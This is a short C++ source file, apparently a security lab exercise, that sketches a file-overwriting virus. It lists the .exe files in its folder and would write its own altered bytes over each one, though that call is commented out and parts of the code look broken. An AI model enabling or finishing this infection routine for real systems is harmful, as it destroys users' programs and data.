// lab3.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <filesystem>
#include <iostream>
#include <fstream>
#include <string>
#include <sstream>

#define EXE_NAME "lab3.exe"
#define VIRUS_SIGNATURE ""

namespace fs = std::filesystem;

void changeExeFile(const fs::path exePath, std::string withText) {
	std::filebuf exeFile;
	exeFile.open(exePath, std::ios::in | std::ios::out);
	if (!exeFile.is_open())
		std::cout << "cannot open" << std::endl;
	exeFile.sputn(withText.c_str(), withText.length());
	exeFile.close();
}

std::string getProgramText(const fs::path exeFilePath) {
	std::ifstream fin(exeFilePath, std::ios::binary | std::ios::in);
	std::string str((std::istreambuf_iterator<char>(fin)),
		std::istreambuf_iterator<char>());
	fin.close();

	std::stringstream wss;
	wss << std::uppercase << "IS"
		<< std::nouppercase << str.substr(2);
	wss >> str;

	return str;
}

int isFileViral(const fs::path exeFilePath) {
	std::ifstream fin(exeFilePath, std::ios::binary | std::ios::in);
	std::string str((std::istreambuf_iterator<char>(fin)),
		std::istreambuf_iterator<char>());
	fin.close();

	return str.find(VIRUS_SIGNATURE);
}

int main()
{
	const fs::path currentDirPath = fs::current_path();
	const fs::path exeFilePath = currentDirPath / EXE_NAME;
	std::string textToWriteInExe = getProgramText(exeFilePath);

	for (const auto& entry : fs::directory_iterator(currentDirPath)) {
		if (entry.is_directory()) continue;
		const fs::path filePath = entry.path();
		if (filePath == exeFilePath) continue;
		if (filePath.extension() == ".exe") {
			std::cout << "File: " << filePath << std::endl;
			//changeExeFile(filePath, textToWriteInExe);
		}
	}



	system("pause");
}
